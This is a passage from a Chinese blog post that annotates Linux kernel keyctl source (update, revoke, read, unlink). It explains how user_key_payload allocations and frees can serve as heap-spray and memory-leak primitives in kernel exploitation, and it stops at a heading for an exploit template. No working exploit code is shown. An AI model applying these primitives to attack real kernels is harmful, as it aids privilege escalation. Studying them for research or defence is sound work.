<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The key control system call</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE5(keyctl, <span class="hljs-type">int</span>, option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg3,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg5)<br>&#123;<br>	<span class="hljs-keyword">switch</span> (option) &#123;<br>	...<br><br>	<span class="hljs-keyword">case</span> KEYCTL_UPDATE:<br>		<span class="hljs-keyword">return</span> keyctl_update_key((<span class="hljs-type">key_serial_t</span>) arg2,<br>					 (<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *) arg3,<br>					 (<span class="hljs-type">size_t</span>) arg4);<br><br>	<span class="hljs-keyword">case</span> KEYCTL_REVOKE:<br>		<span class="hljs-keyword">return</span> keyctl_revoke_key((<span class="hljs-type">key_serial_t</span>) arg2);<br><br>	...<br><br>	<span class="hljs-keyword">case</span> KEYCTL_READ:<br>		<span class="hljs-keyword">return</span> keyctl_read_key((<span class="hljs-type">key_serial_t</span>) arg2,<br>				       (<span class="hljs-type">char</span> __user *) arg3,<br>				       (<span class="hljs-type">size_t</span>) arg4);<br>	<br>    <span class="hljs-keyword">case</span> KEYCTL_UNLINK:<br>		<span class="hljs-keyword">return</span> keyctl_keyring_unlink((<span class="hljs-type">key_serial_t</span>) arg2,<br>					     (<span class="hljs-type">key_serial_t</span>) arg3);<br><br>	...<br><br>	<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>	&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="one-KEYCTL-UPDATE"><a href="#one-KEYCTL-UPDATE" class="headerlink" title=":one:KEYCTL_UPDATE"></a>:one:KEYCTL_UPDATE</h4><p>首先该选项会调用key_update_key函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Update a key&#x27;s data payload from the given data.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The key must grant the caller Write permission and the key type must support</span><br><span class="hljs-comment"> * updating for this to work.  A negative key can be positively instantiated</span><br><span class="hljs-comment"> * with this call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, 0 will be returned.  If the key type does not support</span><br><span class="hljs-comment"> * updating, then -EOPNOTSUPP will be returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">keyctl_update_key</span><span class="hljs-params">(<span class="hljs-type">key_serial_t</span> id,</span><br><span class="hljs-params">		       <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *_payload,</span><br><span class="hljs-params">		       <span class="hljs-type">size_t</span> plen)</span><br>&#123;<br>	<span class="hljs-type">key_ref_t</span> key_ref;<br>	<span class="hljs-type">void</span> *payload;<br>	<span class="hljs-type">long</span> ret;<br><br>	ret = -EINVAL;<br>	<span class="hljs-keyword">if</span> (plen &gt; PAGE_SIZE)<br>		<span class="hljs-keyword">goto</span> error;<br><br>	<span class="hljs-comment">/* pull the payload in if one was supplied */</span><br>	payload = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">if</span> (plen) &#123;<br>		ret = -ENOMEM;<br>		payload = kvmalloc(plen, GFP_KERNEL); 	<span class="hljs-comment">//分配临时payload</span><br>		<span class="hljs-keyword">if</span> (!payload)<br>			<span class="hljs-keyword">goto</span> error;<br><br>		ret = -EFAULT;<br>		<span class="hljs-keyword">if</span> (copy_from_user(payload, _payload, plen) != <span class="hljs-number">0</span>)<br>			<span class="hljs-keyword">goto</span> error2;<br>	&#125;<br><br>	...<br>	<br>	<span class="hljs-comment">/* update the key */</span><br>	ret = key_update(key_ref, payload, plen);<br>	<br>	...<br>	<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该函数首先分配一个临时堆块来存放payload，然后传入key_update核心处理函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * key_update - Update a key&#x27;s contents.</span><br><span class="hljs-comment"> * @key_ref: The pointer (plus possession flag) to the key.</span><br><span class="hljs-comment"> * @payload: The data to be used to update the key.</span><br><span class="hljs-comment"> * @plen: The length of @payload.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Attempt to update the contents of a key with the given payload data.  The</span><br><span class="hljs-comment"> * caller must be granted Write permission on the key.  Negative keys can be</span><br><span class="hljs-comment"> * instantiated by this method.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns 0 on success, -EACCES if not permitted and -EOPNOTSUPP if the key</span><br><span class="hljs-comment"> * type does not support updating.  The key type may return other errors.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">key_update</span><span class="hljs-params">(<span class="hljs-type">key_ref_t</span> key_ref, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *payload, <span class="hljs-type">size_t</span> plen)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key_preparsed_payload</span> <span class="hljs-title">prep</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span> *<span class="hljs-title">key</span> =</span> key_ref_to_ptr(key_ref);<br>	<span class="hljs-type">int</span> ret;<br><br>	key_check(key);<br><br>	<span class="hljs-comment">/* 该key必须可写 */</span><br>	ret = key_permission(key_ref, KEY_NEED_WRITE);<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> ret;<br><br>	<span class="hljs-comment">/* 尝试更新 */</span><br>	<span class="hljs-keyword">if</span> (!key-&gt;type-&gt;update)<br>		<span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><br>	<span class="hljs-built_in">memset</span>(&amp;prep, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(prep));<br>	prep.data = payload;<br>	prep.datalen = plen;<br>	prep.quotalen = key-&gt;type-&gt;def_datalen;<br>	prep.expiry = TIME64_MAX;<br>	<span class="hljs-keyword">if</span> (key-&gt;type-&gt;preparse) &#123;<br>		ret = key-&gt;type-&gt;preparse(&amp;prep); 	 	<span class="hljs-comment">//类似前面user_key_payload分配，也就是在prep的payload字段附上我们新的user_key_payload</span><br>		<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>			<span class="hljs-keyword">goto</span> error;<br>	&#125;<br><br>	down_write(&amp;key-&gt;sem);<br><br>	ret = key-&gt;type-&gt;update(key, &amp;prep); 	 <br>	<br>	...<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们可以看到上面的最后一行，在我们调用完key-&gt;type-&gt;preparse(&amp;prep)，再调用key-&gt;type-&gt;update，它对应user_update函数，如下：</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * update a user defined key</span><br><span class="hljs-comment"> * - the key&#x27;s semaphore is write-locked</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">user_update</span>(<span class="hljs-params"><span class="hljs-keyword">struct</span> key *key, <span class="hljs-keyword">struct</span> key_preparsed_payload *prep</span>)</span><br>&#123;<br>	<span class="hljs-keyword">struct</span> user_key_payload *zap = NULL;<br>	<span class="hljs-built_in">int</span> ret;<br><br>	<span class="hljs-comment">/* check the quota and attach the new data */</span><br>	ret = key_payload_reserve(key, prep-&gt;datalen);<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> ret;<br><br>	<span class="hljs-comment">/* attach the new data, displacing the old */</span><br>	key-&gt;expiry = prep-&gt;expiry;<br>	<span class="hljs-keyword">if</span> (key_is_positive(key))<br>		zap = dereference_key_locked(key);<br>	rcu_assign_keypointer(key, prep-&gt;payload.data[<span class="hljs-number">0</span>]);<br>	prep-&gt;payload.data[<span class="hljs-number">0</span>] = NULL;<br><br>	<span class="hljs-keyword">if</span> (zap)<br>		call_rcu(&amp;zap-&gt;rcu, user_free_payload_rcu);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rcu_assign_keypointer(KEY, PAYLOAD)				\</span><br><span class="hljs-keyword">do</span> &#123;									\<br>	rcu_assign_pointer((KEY)-&gt;payload.rcu_data0, (PAYLOAD));	\<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)<br>    <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rcu_assign_pointer(p, v)	do &#123; (p) = (v); &#125; while (0)</span><br></code></pre></td></tr></table></figure>

<p>上面函数可以看到我们是将prep-&gt;payload.data[0],也就是我们新分配的user_key_payload赋值给key-&gt;payload.rcu_data0,这也就实现了我们的key更新，在这之后我们同样恰当的将临时存放user_key_payload的指针置空。</p>
<p>这里总结一下更新操作：</p>
<ol>
<li>keyctl_update_key首先分配一个临时object来存放我们传入的新payload，大小同样是我们传入的plen，然后调用key_update</li>
<li>key_update首先调用user_preparse(type为”user”的前提下，下面类似)，分配新的user_key_payload来存放，然后调用user_update来将payload指针更新</li>
<li>返回到keyctl_update_key，释放掉临时payload</li>
</ol>
<h4 id="two-KEYCTL-REVOKE"><a href="#two-KEYCTL-REVOKE" class="headerlink" title=":two:KEYCTL_REVOKE"></a>:two:KEYCTL_REVOKE</h4><p>该选项调用keyctl_revoke_key函数，具体功能是唤醒一个key</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Revoke a key.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The key must be grant the caller Write or Setattr permission for this to</span><br><span class="hljs-comment"> * work.  The key type should give up its quota claim when revoked.  The key</span><br><span class="hljs-comment"> * and any links to the key will be automatically garbage collected after a</span><br><span class="hljs-comment"> * certain amount of time (/proc/sys/kernel/keys/gc_delay).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Keys with KEY_FLAG_KEEP set should not be revoked.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, 0 is returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">keyctl_revoke_key</span><span class="hljs-params">(<span class="hljs-type">key_serial_t</span> id)</span><br>&#123;<br>	...<br>	<span class="hljs-keyword">if</span> (test_bit(KEY_FLAG_KEEP, &amp;key-&gt;flags))<br>		ret = -EPERM;<br>	<span class="hljs-keyword">else</span><br>		key_revoke(key);<br><br>	key_ref_put(key_ref);<br>error:<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其会调用key_revoke函数，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * key_revoke - Revoke a key.</span><br><span class="hljs-comment"> * @key: The key to be revoked.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Mark a key as being revoked and ask the type to free up its resources.  The</span><br><span class="hljs-comment"> * revocation timeout is set and the key and all its links will be</span><br><span class="hljs-comment"> * automatically garbage collected after key_gc_delay amount of time if they</span><br><span class="hljs-comment"> * are not manually dealt with first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">key_revoke</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> key *key)</span><br>&#123;<br>    <br>	...<br>	down_write_nested(&amp;key-&gt;sem, <span class="hljs-number">1</span>);<br>	<span class="hljs-keyword">if</span> (!test_and_set_bit(KEY_FLAG_REVOKED, &amp;key-&gt;flags)) &#123;<br>		notify_key(key, NOTIFY_KEY_REVOKED, <span class="hljs-number">0</span>);<br>		<span class="hljs-keyword">if</span> (key-&gt;type-&gt;revoke)<br>			key-&gt;type-&gt;revoke(key);<br><br>	...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>函数会调用key-&gt;type-&gt;revoke(&amp;key),其对应函数user_revoke</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * dispose of the links from a revoked keyring</span><br><span class="hljs-comment"> * - called with the key sem write-locked</span><br><span class="hljs-comment"> */</span><br>void user<span class="hljs-constructor">_revoke(<span class="hljs-params">struct</span> <span class="hljs-params">key</span> <span class="hljs-operator">*</span><span class="hljs-params">key</span>)</span><br>&#123;<br>	<span class="hljs-keyword">struct</span> user_key_payload *upayload = user<span class="hljs-constructor">_key_payload_locked(<span class="hljs-params">key</span>)</span>;<br><br>	<span class="hljs-comment">/* clear the quota */</span><br>	key<span class="hljs-constructor">_payload_reserve(<span class="hljs-params">key</span>, 0)</span>;<br><br>	<span class="hljs-keyword">if</span> (upayload) &#123;<br>		rcu<span class="hljs-constructor">_assign_keypointer(<span class="hljs-params">key</span>, NULL)</span>; 	<span class="hljs-comment">//这里将我们key里面存放的user_key_payload置空</span><br>		call<span class="hljs-constructor">_rcu(&amp;<span class="hljs-params">upayload</span>-&gt;<span class="hljs-params">rcu</span>, <span class="hljs-params">user_free_payload_rcu</span>)</span>; 	<span class="hljs-comment">//释放原先的user_key_payload</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="three-KEYCTL-READ"><a href="#three-KEYCTL-READ" class="headerlink" title=":three:KEYCTL_READ"></a>:three:KEYCTL_READ</h4><p>泄露来力！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Read a key&#x27;s payload.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The key must either grant the caller Read permission, or it must grant the</span><br><span class="hljs-comment"> * caller Search permission when searched for from the process keyrings.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, we place up to buflen bytes of data into the buffer, if one</span><br><span class="hljs-comment"> * is provided, and return the amount of data that is available in the key,</span><br><span class="hljs-comment"> * irrespective of how much we copied into the buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">keyctl_read_key</span><span class="hljs-params">(<span class="hljs-type">key_serial_t</span> keyid, <span class="hljs-type">char</span> __user *buffer, <span class="hljs-type">size_t</span> buflen)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span> *<span class="hljs-title">key</span>;</span><br>	<span class="hljs-type">key_ref_t</span> key_ref;<br>	<span class="hljs-type">long</span> ret;<br>	<span class="hljs-type">char</span> *key_data = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-type">size_t</span> key_data_len;<br><br>	...<br><br>	key_data_len = (buflen &lt;= PAGE_SIZE) ? buflen : <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>		<span class="hljs-keyword">if</span> (key_data_len) &#123;<br>			key_data = kvmalloc(key_data_len, GFP_KERNEL); 	<span class="hljs-comment">//分配一个key_data_len的堆块</span><br>			<span class="hljs-keyword">if</span> (!key_data) &#123;<br>				ret = -ENOMEM;<br>				<span class="hljs-keyword">goto</span> key_put_out;<br>			&#125;<br>		&#125;<br><br>		ret = __keyctl_read_key(key, key_data, key_data_len); 	<span class="hljs-comment">//调用user_read函数，他会将我们原来的payload内容复制到key_data里面</span><br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Read methods will just return the required length without</span><br><span class="hljs-comment">		 * any copying if the provided length isn&#x27;t large enough.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span> || ret &gt; buflen)<br>			<span class="hljs-keyword">break</span>;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * The key may change (unlikely) in between 2 consecutive</span><br><span class="hljs-comment">		 * __keyctl_read_key() calls. In this case, we reallocate</span><br><span class="hljs-comment">		 * a larger buffer and redo the key read when</span><br><span class="hljs-comment">		 * key_data_len &lt; ret &lt;= buflen.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (ret &gt; key_data_len) &#123;<br>			<span class="hljs-keyword">if</span> (unlikely(key_data))<br>				kvfree_sensitive(key_data, key_data_len);<br>			key_data_len = ret;<br>			<span class="hljs-keyword">continue</span>;	<span class="hljs-comment">/* Allocate buffer */</span><br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (copy_to_user(buffer, key_data, ret))<br>			ret = -EFAULT;<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>	kvfree_sensitive(key_data, key_data_len);<br><br>key_put_out:<br>	key_put(key);<br>out:<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>调用了user_key函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * read the key data</span><br><span class="hljs-comment"> * - the key&#x27;s semaphore is read-locked</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">user_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> key *key, <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> buflen)</span><br>&#123;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_key_payload</span> *<span class="hljs-title">upayload</span>;</span><br>	<span class="hljs-type">long</span> ret;<br><br>	upayload = user_key_payload_locked(key); 	<span class="hljs-comment">//获取key的user_key_payload</span><br>	ret = upayload-&gt;datalen;<br><br>	<span class="hljs-comment">/* we can return the data as is */</span><br>	<span class="hljs-keyword">if</span> (buffer &amp;&amp; buflen &gt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-keyword">if</span> (buflen &gt; upayload-&gt;datalen)<br>			buflen = upayload-&gt;datalen;<br><br>		<span class="hljs-built_in">memcpy</span>(buffer, upayload-&gt;data, buflen);<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其逻辑大概就是，keyctl_read_key首先分配一个临时堆块，然后将我们key里面的payload读入到该临时堆块当中，读多少取决于user_key_payload当中的datalen和自身的buflen，读完后，再调用copy_to_user来复制到我们的buf当中，最后释放该临时堆块,这里的返回值位upload-&gt;datalen</p>
<h4 id="four-KEYCTL-UNLINK"><a href="#four-KEYCTL-UNLINK" class="headerlink" title=":four:KEYCTL_UNLINK"></a>:four:KEYCTL_UNLINK</h4><p>从keyring当中注销一个key,这个倒没什么好讲的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Unlink a key from a keyring.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The keyring must grant the caller Write permission for this to work; the key</span><br><span class="hljs-comment"> * itself need not grant the caller anything.  If the last link to a key is</span><br><span class="hljs-comment"> * removed then that key will be scheduled for destruction.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Keys or keyrings with KEY_FLAG_KEEP set should not be unlinked.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, 0 will be returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">keyctl_keyring_unlink</span><span class="hljs-params">(<span class="hljs-type">key_serial_t</span> id, <span class="hljs-type">key_serial_t</span> ringid)</span><br>&#123;<br>	<span class="hljs-type">key_ref_t</span> keyring_ref, key_ref;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span> *<span class="hljs-title">keyring</span>, *<span class="hljs-title">key</span>;</span><br>	<span class="hljs-type">long</span> ret;<br><br>	keyring_ref = lookup_user_key(ringid, <span class="hljs-number">0</span>, KEY_NEED_WRITE);<br>	<span class="hljs-keyword">if</span> (IS_ERR(keyring_ref)) &#123;<br>		ret = PTR_ERR(keyring_ref);<br>		<span class="hljs-keyword">goto</span> error;<br>	&#125;<br><br>	key_ref = lookup_user_key(id, KEY_LOOKUP_PARTIAL, KEY_NEED_UNLINK);<br>	<span class="hljs-keyword">if</span> (IS_ERR(key_ref)) &#123;<br>		ret = PTR_ERR(key_ref);<br>		<span class="hljs-keyword">goto</span> error2;<br>	&#125;<br><br>	keyring = key_ref_to_ptr(keyring_ref);<br>	key = key_ref_to_ptr(key_ref);<br>	<span class="hljs-keyword">if</span> (test_bit(KEY_FLAG_KEEP, &amp;keyring-&gt;flags) &amp;&amp;<br>	    test_bit(KEY_FLAG_KEEP, &amp;key-&gt;flags))<br>		ret = -EPERM;<br>	<span class="hljs-keyword">else</span><br>		ret = key_unlink(keyring, key);<br><br>	key_ref_put(key_ref);<br>error2:<br>	key_ref_put(keyring_ref);<br>error:<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="4-板子"><a href="#4-板子" class="headerlink" title="4.板子"></a>4.板子</h3><p>方便使用user_key_payload</p>
